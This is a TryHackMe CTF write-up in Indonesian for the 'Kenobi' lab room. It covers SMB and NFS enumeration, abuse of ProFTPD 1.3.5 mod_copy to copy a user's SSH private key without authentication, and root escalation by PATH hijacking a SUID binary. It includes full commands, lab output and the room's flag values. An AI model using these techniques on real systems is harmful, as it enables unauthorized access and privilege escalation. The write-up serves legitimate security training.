# TryHackMe — Kenobi CTF Writeup
**Platform:** TryHackMe  
**Room:** Kenobi  
**Status:** ✅ Completed  

---

## Deskripsi Room

Room ini mencakup teknik-teknik dasar penetration testing, yaitu:
- Mengakses **Samba share** untuk enumerasi informasi
- Memanipulasi **ProFTPD 1.3.5** yang rentan untuk mendapatkan akses awal (initial access)
- Eskalasi hak akses ke **root** melalui **SUID binary** yang tidak aman

---

## Flags

| Flag | Value |
|------|-------|
| User Flag | `d0b0f3f53b6caa532a83915e19224899` |
| Root Flag | `177b3cd8562289f37382721c28381f02` |

---

## Tahap 1 — Enumerasi (Nmap Scan)

### Tujuan
Menemukan port yang terbuka dan layanan yang berjalan pada mesin target.

### Perintah

```bash
nmap 10.49.130.97
```

### Hasil

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-03 09:06 +0700
Nmap scan report for 10.49.130.97
Host is up (0.12s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
Nmap done: 1 IP address (1 host up) scanned in 6.66 seconds
```

### Temuan

| Port | Layanan | Keterangan |
|------|---------|-----------|
| 21 | FTP | ProFTPD 1.3.5 |
| 22 | SSH | OpenSSH |
| 80 | HTTP | Apache Web Server |
| 111 | rpcbind | Remote Procedure Call |
| 139 | netbios-ssn | Samba |
| 445 | microsoft-ds | Samba (SMB) |
| 2049 | NFS | Network File System |

> **Jawaban:** Jumlah port terbuka = **7**

---

## Tahap 2 — Enumerasi SMB (Samba)

### Pemahaman
**Samba** adalah implementasi protokol SMB (Server Message Block) untuk sistem Unix/Linux. SMB memungkinkan berbagi file, printer, dan resource jaringan antar mesin. Samba sering ditemukan di lingkungan jaringan campuran Windows-Linux.

SMB berjalan di dua port:
- **Port 445** — SMB over TCP (modern)
- **Port 139** — SMB over NetBIOS (lama)

### 2.1 Enumerasi Share dengan Nmap

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.49.130.97
```

### 2.2 List Share yang Tersedia

```bash
smbclient -L //10.49.130.97/anonymous -N
```

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
anonymous       Disk
IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
```

> **Jawaban:** Jumlah share = **3** (print$, anonymous, IPC$)

### 2.3 Akses Share Anonymous dan Download File

```bash
smbclient //10.49.130.97/anonymous -N
```

```
smb: \> ls
  .                                   D        0  Wed Sep  4 17:49:09 2019
  ..                                  D        0  Sat Aug  9 20:03:22 2025
  log.txt                             N    12237  Wed Sep  4 17:49:09 2019

smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (20.0 KiloBytes/sec)
```

> **Jawaban:** File yang ditemukan = **log.txt**

### 2.4 Analisis log.txt

Dari isi `log.txt` ditemukan dua informasi krusial:

**1. SSH key generation untuk user Kenobi:**
```
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa):
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
```

**2. Konfigurasi ProFTPD berjalan sebagai user Kenobi di port 21:**
```
Port  21
User  kenobi
Group kenobi
```

> **Jawaban:** FTP berjalan di port **21**

### 2.5 Enumerasi NFS Mount

Port 111 menjalankan **rpcbind** yang memberi akses ke Network File System (NFS). Kita enumerasi mount yang tersedia:

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.49.130.97
```

```
| nfs-showmount:
|_  /var *
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2025-08-10T06:48:58  cache
| rwxrwxrwx   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwxr-x   0    108  4096  2026-06-03T01:33:34  log
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
```

> **Jawaban:** Mount yang terlihat = **/var**

---

## Tahap 3 — Eksploitasi ProFTPD (Initial Access)

### Pemahaman
**ProFTPD 1.3.5** memiliki kerentanan pada modul `mod_copy`. Modul ini mengimplementasikan perintah `SITE CPFR` (Copy From) dan `SITE CPTO` (Copy To) yang memungkinkan **klien yang tidak terautentikasi** menyalin file dari mana saja di filesystem ke lokasi yang dipilih.

Karena FTP berjalan sebagai user **Kenobi**, kita bisa menyalin private SSH key milik Kenobi ke direktori `/var/tmp` yang bisa kita akses via NFS mount.

### 3.1 Cek Versi ProFTPD

```bash
nmap -p21 -sV -sC 10.49.130.97
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5
```

Atau dengan netcat:
```bash
nc 10.49.130.97 21
```
```
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.49.130.97]
```

> **Jawaban:** Versi ProFTPD = **1.3.5**

### 3.2 Cari Exploit dengan Searchsploit

```bash
searchsploit ProFTPD 1.3.5
```

```
Exploit Title                                          |  Path
--------------------------------------------------------+--------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (MSF)    | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution   | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution 2 | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                              | linux/remote/36742.txt
```

> **Jawaban:** Jumlah exploit = **4**

### 3.3 Eksploitasi mod_copy — Salin SSH Private Key

Sambungkan ke FTP via netcat dan gunakan perintah SITE CPFR/CPTO:

```bash
nc 10.49.130.97 21
```

```
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.49.130.97]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

> Private key berhasil disalin ke `/var/tmp/id_rsa`

### 3.4 Mount NFS dan Ambil Private Key

```bash
sudo mkdir /mnt/kenobiNFS
mount 10.49.130.97:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```

```
drwxr-xr-x 14 root root  4096 Sep  4  2019 .
drwxr-xr-x  8 root root  4096 Jun  3 09:27 ..
drwxrwxrwt  8 root root  4096 Jun  3 08:39 tmp
drwxr-xr-x  3 root root  4096 Sep  4  2019 www
...
```

Salin private key ke direktori lokal:

```bash
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
```

### 3.5 Login SSH sebagai Kenobi

```bash
ssh -i id_rsa kenobi@10.49.130.97
```

```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
...
Last login: Sat Aug  9 07:57:51 2025 from 10.23.8.228

kenobi@kenobi:~$ ls
share  user.txt

kenobi@kenobi:~$ cat user.txt
d0b0f3f53b6caa532a83915e19224899
```

> 🎉 **User Flag:** `d0b0f3f53b6caa532a83915e19224899`

---

## Tahap 4 — Privilege Escalation (Root via SUID Binary)

### Pemahaman SUID

| Permission | Pada File | Pada Direktori |
|-----------|-----------|---------------|
| **SUID** | File dieksekusi dengan permission **pemilik file** (bukan user yang menjalankan) | Tidak berlaku |
| **SGID** | File dieksekusi dengan permission **group pemilik** | File baru mendapat group yang sama |
| **Sticky Bit** | Tidak bermakna | User tidak bisa menghapus file milik user lain |

**Bahaya SUID:** Jika sebuah binary memiliki SUID bit dan dimiliki oleh root, maka siapapun yang menjalankannya akan mendapat hak root sementara. Jika binary tersebut bisa dimanipulasi, bisa dijadikan eskalasi ke root.

### 4.1 Cari Binary dengan SUID Bit

```bash
find / -perm -u=s -type f 2>/dev/null
```

```
/snap/core20/2599/usr/bin/chfn
/snap/core20/2599/usr/bin/passwd
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/menu          ← INI YANG MENCURIGAKAN
/usr/bin/sudo
/usr/bin/newgrp
/bin/mount
/bin/su
...
```

> **Jawaban:** File mencurigakan = **/usr/bin/menu**

### 4.2 Analisis Binary /usr/bin/menu

```bash
/usr/bin/menu
```

```
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```

> **Jawaban:** Jumlah opsi = **3**

### 4.3 Analisis dengan Strings

```bash
strings /usr/bin/menu
```

Binary ini memanggil perintah `curl`, `uname`, dan `ifconfig` **tanpa full path** (hanya nama perintahnya saja, tidak `/usr/bin/curl`). Ini berarti binary menggunakan variabel `$PATH` untuk mencari perintah tersebut.

**Celah:** Karena `/usr/bin/menu` berjalan sebagai root (SUID), kita bisa membuat file palsu bernama `curl` di direktori yang kita kontrol, lalu menaruh direktori itu di depan `$PATH`. Ketika menu memanggil `curl`, ia akan menemukan shell kita duluan!

### 4.4 Eksploitasi PATH Manipulation

**Langkah 1:** Buat shell palsu bernama `curl` di `/tmp`:

```bash
cd /tmp
echo '/bin/sh' > /tmp/curl
chmod +x /tmp/curl
```

**Langkah 2:** Tambahkan `/tmp` ke depan PATH:

```bash
export PATH=/tmp:$PATH
```

**Langkah 3:** Jalankan binary menu dan pilih opsi 1 (status check yang memanggil curl):

```bash
/usr/bin/menu
```

```
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# whoami
root
```

**Langkah 4:** Ambil root flag:

```bash
# cat /root/root.txt
177b3cd8562289f37382721c28381f02
```

> 🎉 **Root Flag:** `177b3cd8562289f37382721c28381f02`

---

## Ringkasan Alur Serangan

```
[Nmap Scan]
    │
    ├── Port 445 (SMB) ──► Enumerasi share ──► log.txt
    │                          │
    │                          └── SSH key path: /home/kenobi/.ssh/id_rsa
    │                          └── FTP user: kenobi, port: 21
    │
    ├── Port 111 (NFS) ──► Mount /var tersedia
    │
    └── Port 21 (FTP) ──► ProFTPD 1.3.5
            │
            └── mod_copy exploit (SITE CPFR/CPTO)
                    │
                    └── Salin id_rsa ke /var/tmp
                            │
                            └── Mount NFS ──► Ambil id_rsa
                                    │
                                    └── SSH login sebagai Kenobi
                                            │
                                            └── USER FLAG ✅
                                                    │
                                                    └── SUID /usr/bin/menu
                                                            │
                                                            └── PATH manipulation
                                                                    │
                                                                    └── ROOT FLAG ✅
```

---

## Ringkasan Teknik dan Tools

| Tahap | Teknik | Tool | Hasil |
|-------|--------|------|-------|
| Recon | Port scanning | `nmap` | 7 port terbuka |
| Enum SMB | Share enumeration | `smbclient`, `nmap script` | Share anonymous, log.txt |
| Enum NFS | NFS mount discovery | `nmap script` | Mount /var |
| Initial Access | mod_copy exploit | `nc` (netcat) | Salin SSH private key |
| Initial Access | NFS mount + SSH | `mount`, `ssh` | Shell sebagai Kenobi |
| Privilege Escalation | SUID + PATH manipulation | `find`, `bash` | Shell sebagai root |

---

## Pelajaran yang Dipetik

1. **Share SMB anonymous** bisa mengekspos informasi sensitif — selalu batasi akses share.
2. **Software usang** (ProFTPD 1.3.5) memiliki kerentanan publik yang terdokumentasi — selalu update.
3. **mod_copy ProFTPD** sangat berbahaya karena memungkinkan copy file tanpa autentikasi.
4. **SUID binary** yang memanggil perintah tanpa full path rentan terhadap PATH hijacking.
5. **NFS mount** yang terbuka bisa dieksploitasi untuk mengambil file sensitif dari server.
6. Prinsip **least privilege** penting — FTP tidak perlu berjalan sebagai user yang sama dengan pemilik SSH key.

---

*Writeup oleh: [username kamu]*  
*Platform: TryHackMe — Room: Kenobi*  
*Tanggal: Juni 2026*
